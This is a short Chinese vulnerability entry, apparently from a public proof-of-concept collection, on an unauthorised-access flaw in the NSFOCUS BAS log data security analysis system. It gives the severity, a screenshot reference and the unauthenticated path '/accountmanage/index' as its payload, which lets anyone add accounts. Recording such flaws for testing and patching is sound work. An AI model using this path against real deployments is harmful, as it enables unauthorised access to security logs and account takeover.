# 绿盟 BAS日志数据安全性分析系统 accountmanage 未授权访问漏洞

## 漏洞描述
绿盟 BAS日志数据安全性分析系统存在未授权访问漏洞，通过漏洞可以添加任意账户登录平台获取敏感信息

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登录页面

![image-20220525145937586](images/202205251459725.png)

未授权页面

```
/accountmanage/index
```


## Payloads
```
/accountmanage/index
```
